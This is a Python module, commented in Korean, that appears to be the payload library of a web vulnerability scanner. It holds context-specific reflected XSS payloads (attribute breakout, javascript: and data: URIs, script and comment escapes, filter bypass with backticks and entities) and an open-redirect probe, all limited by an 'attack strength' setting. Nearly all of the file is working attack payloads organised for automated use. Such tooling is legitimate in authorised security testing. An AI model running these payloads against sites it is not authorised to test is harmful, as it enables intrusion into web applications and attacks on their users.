from typing import Dict, List

Payload = Dict[str, str]

# 공격 강도별 요청 개수 제한
STRENGTH_LIMIT = {
    "LOW": 3,
    "MEDIUM": 6,
    "HIGH": 12,
    "INSANE": 100,
}

# value="" 속성 탈출 + 이벤트 삽입 (reflected XSS 핵심)
ATTR_VALUE: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "dq_img_onerror", "payload": "\"><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "sq_img_onerror", "payload": "'><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "dq_mouseover", "payload": "\" onmouseover=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "sq_mouseover", "payload": "' onmouseover=alert(1) x='"},
    {"type": "REFLECTED_XSS", "family": "dq_onfocus", "payload": "\" autofocus onfocus=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "dq_img_backtick", "payload": "\"><img src=x onerror=alert`1`>"},
]

# href/src 같은 URL 속성 → javascript: / data: 기반 XSS
ATTR_HREF: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "javascript_uri", "payload": "javascript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "data_html", "payload": "data:text/html,<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "attr_break_mouseover", "payload": "\" onmouseover=alert(1) href=\"#"},
]

# <script> 내부 탈출
SCRIPT_CONTEXT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "break_dq", "payload": "\";alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "break_sq", "payload": "';alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "close_script", "payload": "</script><script>alert(1)</script>"},
]

# HTML 주석 탈출
HTML_COMMENT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "comment_img", "payload": "--><img src=x onerror=alert(1)><!--"},
]

# body 직접 삽입 (필터 약할 때)
BODY: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "img_onerror", "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "svg_onload", "payload": "<svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "img_backtick", "payload": "<img src=x onerror=alert`1`>"},
]

# 필터 우회 (핵심: backtick, entity)
FILTERED_ATTR: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "backtick_attr", "payload": "\" onmouseover=alert`1` x=\""},
    {"type": "REFLECTED_XSS", "family": "entity_equals", "payload": "\" onmouseover&#61;alert(1) x=\""},
]

# URL 파라미터 기반 XSS / Open Redirect
URL_REDIRECT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "url_mouseover", "payload": "\" onmouseover=alert(1) x=\""},
    {"type": "OPEN_REDIRECT", "family": "external", "payload": "https://example.com/"},
]

def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]

def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
    seen = set()
    result: List[Payload] = []
    for payloads in groups:
        for item in payloads:
            if item["payload"] in seen:
                continue
            seen.add(item["payload"])
            result.append(item)
    return result

# context별 payload 매핑
CONTEXT_MAP: Dict[str, List[Payload]] = {
    "attr_value": ATTR_VALUE,
    "attr_href": ATTR_HREF,
    "script": SCRIPT_CONTEXT,
    "html_comment": HTML_COMMENT,
    "body": BODY,
    "stx_filtered": FILTERED_ATTR,
    "url_redirect": URL_REDIRECT,
    "unknown": _dedupe([BODY, ATTR_VALUE]),
    "none": [],
}

def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    return _limit(CONTEXT_MAP.get(context.lower(), BODY), strength)

def get_all() -> List[Payload]:
    return _dedupe([
        ATTR_VALUE,
        ATTR_HREF,
        SCRIPT_CONTEXT,
        HTML_COMMENT,
        BODY,
        FILTERED_ATTR,
        URL_REDIRECT,
    ])